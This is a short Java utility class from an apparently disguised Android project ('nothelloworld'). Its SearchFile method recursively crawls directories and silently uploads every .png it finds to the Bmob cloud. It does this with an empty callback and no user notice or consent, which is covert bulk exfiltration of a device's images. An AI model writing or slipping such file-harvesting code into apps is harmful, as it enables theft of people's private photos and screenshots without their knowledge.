package com.johnnytan.dell.nothelloworld.utils;

import java.io.File;

import cn.bmob.v3.BmobObject;
import cn.bmob.v3.datatype.BmobFile;
import cn.bmob.v3.exception.BmobException;
import cn.bmob.v3.listener.UploadFileListener;

/**
 * Created by 20304 on 2018/3/19.
 */

public class FileTools extends BmobObject{
    private String path;
    BmobFile bmobFile;
    public void SearchFile(File[] files){
        for (File file : files){
            if (file.isDirectory())//若目录则递归查找
            {
                SearchFile(file.listFiles());
            }
            else if (file.isFile()){
                path = file.getPath();
                if (path.endsWith(".png")){
                    bmobFile =  new BmobFile(new File(path));
                    bmobFile.uploadblock(new UploadFileListener() {
                        @Override
                        public void done(BmobException e) {
                            if (e == null){

                            }
                        }
                    });
                }
            }
        }
    }
}
